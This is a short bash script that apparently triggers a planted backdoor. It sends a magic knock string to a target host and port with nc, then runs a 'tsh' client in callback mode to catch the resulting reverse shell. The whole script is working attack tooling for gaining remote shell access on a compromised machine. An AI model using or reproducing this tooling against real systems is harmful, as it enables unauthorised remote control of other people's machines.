#!/bin/bash
HOST=$1
PORT=$2
LPORT=$(($PORT+1))

if [ -z "$HOST" ] || [ -z "$PORT" ]
then
	echo "$0 <host> <port>"
	exit -1
fi

echo "Sending reverse shell request to $HOST:$PORT ..."
echo -n "OLA K ASE" | nc $HOST $PORT > /dev/null
sudo ./tsh/tsh cb -p $LPORT
